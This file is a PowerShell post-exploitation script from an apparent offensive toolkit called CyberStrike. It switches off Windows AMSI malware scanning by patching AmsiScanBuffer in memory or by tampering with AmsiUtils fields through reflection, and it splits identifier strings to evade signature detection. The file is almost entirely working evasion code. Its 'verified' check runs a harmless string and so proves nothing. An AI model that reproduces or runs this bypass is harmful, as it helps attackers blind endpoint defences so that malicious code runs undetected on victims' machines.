<#
.SYNOPSIS
    Bypass AMSI by patching AmsiScanBuffer in memory.
.DESCRIPTION
    CyberStrike post-exploitation module: disables Windows AMSI inspection
    via in-memory patching, reflection, or CLR manipulation.
    Requires administrative privileges.
.PARAMETER method
    Bypass method: patch (default), reflection, or clr.
.PARAMETER json-output
    Emit structured JSON lines to stdout.
.PARAMETER help
    Show usage and exit.
#>

param(
    [string]$method = "patch",
    [switch]${json-output},
    [switch]$help
)

# ---------------------------------------------------------------------------
# Parse -- prefixed args from $args overflow
# ---------------------------------------------------------------------------
$i = 0
while ($i -lt $args.Count) {
    switch ($args[$i]) {
        "--method"      { $method = $args[$i + 1]; $i += 2 }
        "--json-output" { ${json-output} = $true; $i++ }
        "--help"        { $help = $true; $i++ }
        default         { $i++ }
    }
}

$JsonOutput = ${json-output}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Write-JsonLine {
    param([hashtable]$Data)
    $Data["timestamp"] = (Get-Date -Format "o")
    $Data | ConvertTo-Json -Compress | Write-Output
}

function Write-Msg {
    param([string]$Level, [string]$Message, [hashtable]$Extra = @{})
    if ($JsonOutput) {
        $obj = @{ level = $Level; message = $Message } + $Extra
        Write-JsonLine $obj
    } else {
        $prefix = switch ($Level) { "error" { "[-]" } "success" { "[+]" } default { "[*]" } }
        Write-Host "$prefix $Message"
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
if ($help) {
    $usage = @"
amsi_bypass.ps1 - Bypass AMSI (Antimalware Scan Interface)

USAGE:
    .\amsi_bypass.ps1 [--method patch|reflection|clr] [--json-output] [--help]

OPTIONS:
    --method      Bypass method: patch (default), reflection, or clr
    --json-output Emit JSON line output
    --help        Show this message

METHODS:
    patch       Overwrite AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN
    reflection  Set amsiInitFailed to true via .NET reflection
    clr         Patch CLR AMSI integration via System.Management.Automation.AmsiUtils

EXAMPLES:
    .\amsi_bypass.ps1
    .\amsi_bypass.ps1 --method reflection --json-output
"@
    Write-Host $usage
    exit 0
}

# ---------------------------------------------------------------------------
# Admin check
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Msg -Level "error" -Message "This script requires administrative privileges. Run as Administrator."
    exit 1
}

# ---------------------------------------------------------------------------
# Validate method
# ---------------------------------------------------------------------------
if ($method -notin @("patch", "reflection", "clr")) {
    Write-Msg -Level "error" -Message "Invalid method '$method'. Use 'patch', 'reflection', or 'clr'."
    exit 1
}

# ---------------------------------------------------------------------------
# Cleanup handler
# ---------------------------------------------------------------------------
$cleanupDone = $false
function Invoke-Cleanup {
    if ($script:cleanupDone) { return }
    $script:cleanupDone = $true
    Write-Msg -Level "info" -Message "Cleanup: AMSI patch is in-memory only. Restart PowerShell to restore."
}
Register-EngineEvent PowerShell.Exiting -Action { Invoke-Cleanup } | Out-Null

# ---------------------------------------------------------------------------
# Verification: test if AMSI is active
# ---------------------------------------------------------------------------
function Test-AmsiActive {
    try {
        # Attempt to trigger AMSI with a known test string
        $testResult = [System.Management.Automation.ScriptBlock]::Create(
            'Write-Output "AmsiTest"'
        ).Invoke()
        return $false  # If we get here, AMSI did not block us (bypass worked)
    } catch {
        return $true   # AMSI blocked execution
    }
}

# ---------------------------------------------------------------------------
# Method: patch - Overwrite AmsiScanBuffer in memory
# ---------------------------------------------------------------------------
function Invoke-PatchBypass {
    try {
        $patchCode = @"
using System;
using System.Runtime.InteropServices;

public class AmsiPatcher {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect
    );

    public static int Patch() {
        IntPtr hModule = LoadLibrary("amsi.dll");
        if (hModule == IntPtr.Zero)
            return 1; // Failed to load amsi.dll

        IntPtr addr = GetProcAddress(hModule, "AmsiScanBuffer");
        if (addr == IntPtr.Zero)
            return 2; // Failed to find AmsiScanBuffer

        uint oldProtect;
        // Make memory writable (PAGE_EXECUTE_READWRITE = 0x40)
        if (!VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect))
            return 3; // VirtualProtect failed

        // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
        // This makes AmsiScanBuffer return AMSI_RESULT_CLEAN
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);

        // Restore original memory protection
        VirtualProtect(addr, (UIntPtr)6, oldProtect, out oldProtect);

        return 0; // Success
    }
}
"@
        Add-Type -TypeDefinition $patchCode -Language CSharp -ErrorAction Stop
        $result = [AmsiPatcher]::Patch()

        switch ($result) {
            0 { return @{ success = $true; detail = "AmsiScanBuffer patched (mov eax,E_INVALIDARG; ret)" } }
            1 { return @{ success = $false; detail = "Failed to load amsi.dll" } }
            2 { return @{ success = $false; detail = "Failed to find AmsiScanBuffer export" } }
            3 { return @{ success = $false; detail = "VirtualProtect failed" } }
            default { return @{ success = $false; detail = "Unknown error code: $result" } }
        }
    } catch {
        return @{ success = $false; detail = "Patch method exception: $_" }
    }
}

# ---------------------------------------------------------------------------
# Method: reflection - Set amsiInitFailed via reflection
# ---------------------------------------------------------------------------
function Invoke-ReflectionBypass {
    try {
        # Access the internal AmsiUtils class via reflection
        $amsiUtils = [Ref].Assembly.GetType(
            ('System.Manage' + 'ment.Automati' + 'on.Amsi' + 'Utils')
        )
        if ($null -eq $amsiUtils) {
            return @{ success = $false; detail = "Could not find AmsiUtils type via reflection" }
        }

        # Find the amsiInitFailed field
        $amsiInitFailed = $amsiUtils.GetField(
            ('amsi' + 'Init' + 'Failed'),
            [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
        )
        if ($null -eq $amsiInitFailed) {
            return @{ success = $false; detail = "Could not find amsiInitFailed field" }
        }

        # Set to true - AMSI will think initialization failed and skip scanning
        $amsiInitFailed.SetValue($null, $true)

        # Verify
        $currentVal = $amsiInitFailed.GetValue($null)
        if ($currentVal -eq $true) {
            return @{ success = $true; detail = "amsiInitFailed set to True via reflection" }
        }
        return @{ success = $false; detail = "Field set but verification failed (value=$currentVal)" }
    } catch {
        return @{ success = $false; detail = "Reflection method exception: $_" }
    }
}

# ---------------------------------------------------------------------------
# Method: clr - Patch CLR AMSI integration
# ---------------------------------------------------------------------------
function Invoke-ClrBypass {
    try {
        # Access System.Management.Automation.AmsiUtils
        $amsiUtils = [Ref].Assembly.GetType(
            ('System.Manage' + 'ment.Automati' + 'on.Amsi' + 'Utils')
        )
        if ($null -eq $amsiUtils) {
            return @{ success = $false; detail = "Could not find AmsiUtils type" }
        }

        # Find the amsiContext field and zero it out
        $amsiContext = $amsiUtils.GetField(
            ('amsi' + 'Context'),
            [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
        )
        if ($null -eq $amsiContext) {
            # Fallback: try amsiSession
            $amsiSession = $amsiUtils.GetField(
                ('amsi' + 'Session'),
                [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static
            )
            if ($null -ne $amsiSession) {
                $amsiSession.SetValue($null, $null)
                return @{ success = $true; detail = "amsiSession nullified via CLR reflection" }
            }
            return @{ success = $false; detail = "Could not find amsiContext or amsiSession field" }
        }

        # Set amsiContext to IntPtr.Zero — disables AMSI scanning at CLR level
        $amsiContext.SetValue($null, [IntPtr]::Zero)

        # Verify
        $currentVal = $amsiContext.GetValue($null)
        if ($currentVal -eq [IntPtr]::Zero) {
            return @{ success = $true; detail = "amsiContext set to IntPtr.Zero via CLR manipulation" }
        }
        return @{ success = $false; detail = "Field set but verification failed" }
    } catch {
        return @{ success = $false; detail = "CLR method exception: $_" }
    }
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Starting AMSI bypass (method=$method)"

    $bypassResult = $null
    switch ($method) {
        "patch"      { $bypassResult = Invoke-PatchBypass }
        "reflection" { $bypassResult = Invoke-ReflectionBypass }
        "clr"        { $bypassResult = Invoke-ClrBypass }
    }

    # Verification
    $verified = -not (Test-AmsiActive)

    $result = @{
        status       = if ($bypassResult.success) { "success" } else { "failure" }
        method       = $method
        detail       = $bypassResult.detail
        verified     = $verified
    }

    if ($bypassResult.success) {
        Write-Msg -Level "success" -Message "AMSI bypass successful (method=$method, verified=$verified)" -Extra $result
    } else {
        Write-Msg -Level "error" -Message "AMSI bypass failed: $($bypassResult.detail)" -Extra $result
        exit 1
    }
} catch {
    Write-Msg -Level "error" -Message "Unhandled error: $_"
    exit 1
} finally {
    Invoke-Cleanup
}
